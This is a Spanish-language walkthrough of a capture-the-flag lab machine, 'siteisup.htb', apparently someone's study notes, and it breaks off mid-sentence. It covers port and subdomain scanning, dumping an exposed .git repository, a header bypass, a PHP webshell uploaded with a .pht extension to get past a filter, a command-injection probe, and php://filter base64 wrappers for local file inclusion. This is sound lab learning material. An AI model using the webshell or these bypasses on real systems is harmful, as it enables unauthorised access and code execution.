```shell
nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv 10.129.49.90 -oG allPorts
```

```shell
nmap -p22,80 -sCV 10.129.49.90 -oN targeted  
```

Usaremos whatweb para ver que tecnologías utiliza
```shell
whatweb http://10.129.49.90
```

No encontramos mucha información
Ejecutaremos el script de nmap `http-enum` que hace la función de fuzer
```shell
nmap --script http-enum -p80 10.129.49.90 
```

Encontramos una salida potencial de un directorio llamado `/dev`
Al navegar a la web a través del navegador encontramos un nombre de dominio llamado *siteisup.htb* que añadiremos al `/etc/hosts`

La web en la que nos encontramos nos valida si la URL de la web que introduces esta activa en este momento o no, podemos levantarnos un servidor con python y comprobar si de verdad la función de la web funciona.
```shell
python3 -m http.server 80 
```

Y hacer la verificación en la web *siteisup.htb* dándonos como respuesta que el servicio que hemos levantado con python esta activo, para ver las cabeceras de la petición podemos ponernos en escucha con netcat
```shell
nc -nlvp 80
```

Obteniendo las cabeceras pero sin obtener mas información de la ya conocida
Ahora probaremos montando de nuevo el servidor http con python usando el modo debug que nos ofrece la web
```shell
python3 -m http.server 80 
```

Al usar este modo nos devuelve información sobre el servicio que esta publicado
Vamos a interceptar la petición con Burpsuite, con el modo debug habilitado
![[Pasted image 20260825124053.png]]

Probaremos cambiando el valor de *debug* cambiándolo de *1* a *0* por ejemplo
Al ponerlo en *1* nos muestra en la respuesta el *textarea* donde aparece la información del modo debug, cuando hacemos la petición a nuestro servidor

Si lo modificamos a *0* ese *textarea* no nos aparece
Probaremos también poniendo el valor en *2* y este nos vuelve a mostrar el *textarea* y modificando el valor a tres nos sucede exactamente lo mismo.

Si en la web probamos a concatenar una instrucción en caso de se este utilizando curl a la hora de hacer la comprobación si el servidor esta levantado o no nos muestra un mensaje indicándonos *Hacking attempt was detected!*. La instrucción introducida es la siguiente
```shell
http://10.10.14.226; whomai
```

Por lo cual llegamos a la conclusión de que la inyección de comandos esta bien sanitizada

También conocemos el directorio `/dev` por lo cual podemos navegar a el, no nos muestra contenido pero sabemos que el directorio existe ya que al probar con otra combinación de caracteres nos muestra *Not Found* cosa que con `/dev` no

Podemos continuar haciendo fuzzing con nmap volviendo a usar el script *http-enum* y con *--script-args* indicar a *http-enum* desde donde queremos que haga el fuzing
```shell
nmap --script http-enum -p80 --script-args http-enum.basepath='/dev' 10.129.49.90
```

Encontrando la ruta `/dev/.git`, navegaremos a el, siendo el contenido que vemos los recursos de un proyecto en *git*, para poder obtener los recursos del proyecto y poderlos visualizar hay una herramienta llamada git-dumper.
```shell
git_dumper.py http://siteisup.htb/dev/.git/ ./project 
```

Encontramos un `admin.php` lo que nos da a entender que puede haber un directorio con ese nombre en la web, probamos en ella sin encontrar nada, lo cual puede significar que haya un subdominio que si que este utilizando ese `admin.php`

Así que vamos a proceder a enumerar subdominios usando ffuf
```shell
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.siteisup.htb" -u http://siteisup.htb -t 20
```

como nos devuelve muchos *200* filtraremos únicamente por el tamaño usando `-fs 1131` en búsqueda de coincidencias
```shell
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.siteisup.htb" -u http://siteisup.htb/ -t 20 -fs 1131
```

Encontrando el subdominio `dev` el cual deberemos de añadir a `/etc/host` para poder acceder y resolver en el navegador y poder acceder a ella a través de `http://dev.siteisup.htb`

Respondiéndonos un *Forbiden*, buscaremos recursos ocultos de nuevo en el proyecto de github que hemos obtenido anteriormente.
Podemos leer un `.htacces` que es donde se controla el acceso a determinados archivos del proyecto.
Se esta aplicando una política en la cual deniega el acceso a todo el mundo al no ser que cuentes con una cabecera llamada *Special-Dev* con el valor de *only4dev*
![[Pasted image 20260825182945.png]]

Ahora añadiremos a la cabecera dentro de la petición usando Burpsuite
En las opciones del proxy en Burpsuite buscare *HTTP Match and Replace* y añadiremos una nueva regla. En *Type* tendremos que poner *Request Header* y en *Replace* la cabecera a incorporar
![[Pasted image 20260825183404.png]]

Ahora al interceptar una petición se nos añadiría automáticamente la cabecera de la regla que hemos creado:
![[Pasted image 20260825183514.png]]

Si dejamos que la petición continúe su trafico después de ser interceptada y modificada vemos que la web `dev.siteisup.htb` ha variado su contenido teniendo ahora aun botón al *Amdin Panel* y una opción de subida de ficheros para validar si una lista de webs están levantadas.

Como temeos un campo de subida de archivo vamos a probar a crearnos un archivo llamado `cmd.php` para subirlo y ver como interacciona la web con el.
En el script vamos a crear un script que nos permita ejecutar comandos
```php
<?php
 echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
?>
```

El script lo que hace es lo siguiente:
- Utiliza etiquetas preformateadas para mantener el formato del texto intacto por parte del navegador
- Con *shell_exec* ejecuta el texto como comando de sistema devolviendo su salida
- Y el parámetro *$_GET* lee el parámetro *cmd* directamente desde la URL

Habiendo así construido una webshell con php
Ahora lo subiremos al servidor y obtendremos como respuesta que la extensión no es permitida.

Buscaremos mas información en los recursos del proyecto en busca de algo que nos pueda aportar mas información sobre la web.
Podemos leer el `change.log` en el cual nos indica varios puntos
![[Pasted image 20260825185616.png]]

Habla sobre eliminar la opción de subida de archivos y esto puede deberse a que haya que eliminarla por que esta este mal configurada o sea vulnerable por algún motivo.

Encontramos tambien un archivo llamdo `checker.php` el cual es el codigo fuente de la web que contiene la subida de archivos y en el encontramos donde tramita la subida de archivos y como la tramita
![[Pasted image 20260825185927.png]]

- Archivos menores a 10Kb
- Extensiones no permitidas *php|html|py|pl|phtml|zip|rar|gz|gzip|tar*
- Una vez tramitada la subida se envía al directorio *uploads*

Ahora vamos a cambiar la extensión del fichero a `.pht` que no esta contemplada en las restricciones

Al subirlo y mirar si este se encuentra en el directorio `uploads` no lo ubicamos por lo cual volvemos a mirar en el archivo de configuración por si algún casual a la hora de subir el archivo este lo borra y nos encontramos con lo siguiente
![[Pasted image 20260825191921.png]]

Lo que nos confirma que el archivo nos lo borra una vez subido.
También podemos mirar el fichero llamado `index.php` en este archivo lo primero que pone en la parte superior *Only for developers*
![[Pasted image 20260826120552.png]]

Vemos que para apuntar al recurso de el *Admin Panel*, utiliza el recurso `?page=admin`, además vemos que esta sanitizado la entrada de este parámetro evitando entradas como `/bin, /usr, /home, /var, /etc`, además a cualquier parámetro que introduzcas se le hace un `include` de la extensión `.php`.

Lo que podemos hacer es a la hora de hacer la consulta hacia `?page=admin` nos esta concatenando al final de la consulta el `.php`, accediendo a la ruta con un botón que te lleva al *Admin Panel*.
Pero en vez de hacer la consulta de esa forma lo que podemos hacer es un wraper que lo codifique en *base64*, y así no interprete el código php y te lo mostraría en *base64*
```php
?page=php://filter/convert.base64-encode/resource=admin
```

Por lo cual ahora por pantalla no muestra el script en *base64*, del archivo `admin.php` ya que concatena después de `admin` la extensión `.php`
```base64
PD9waHAKI0VtcHR5IGZvciBub3cuCj8+
```

Lo decodeamos el *base64*
```shell
echo -n 'PD9waHAKI0VtcHR5IGZvciBub3cuCj8+' | base64 -d; echo
```

Dándonos como resultado el código `php` del `admin.php`
```php
<?php
#Empty for now.
?>
```

También sabemos que tenemos el archivo `index` así que vamos a hacer la enumeración del código igual que hemos hecho con `admin`
```php
?page=php://filter/convert.base64-encode/resource=index
```

Decodeamos de nuevo el *base64*
```shell
echo -n 'PGI+VGhpcyBpcyBvbmx5IGZvciBkZXZlbG9wZXJzPC9iPgo8YnI+CjxhIGhyZWY9Ij9wYWdlPWFkbWluIj5BZG1pbiBQYW5lbDwvYT4KPD9waHAKCWRlZmluZSgiRElSRUNUQUNDRVNTIixmYWxzZSk7CgkkcGFnZT0kX0dFVFsncGFnZSddOwoJaWYoJHBhZ2UgJiYgIXByZWdfbWF0Y2goIi9iaW58dXNyfGhvbWV8dmFyfGV0Yy9pIiwkcGFnZSkpewoJCWluY2x1ZGUoJF9HRVRbJ3BhZ2UnXSAuICIucGhwIik7Cgl9ZWxzZXsKCQlpbmNsdWRlKCJjaGVja2VyLnBocCIpOwoJfQkKPz4K' | base64 -d; echo
```

Obteniendo el mismo contenido que ya conocíamos del `index.php`
Sabemos que existe el directorio `/uploads` que parte directamente desde la raíz del servicio web.
Podemos emplear otros wrapers, por ejemplo si al apuntar con el parámetro `?page=` a `uploads/` lo que haremos seria meternos al directorio `uploads`

Como hemos visto anteriormente lo único que valida es que no acedamos a los directorios indicados en el `index.php`
Además también hemos visto en el `checker.php` que elimina el archivo al finalizar el código, así que 


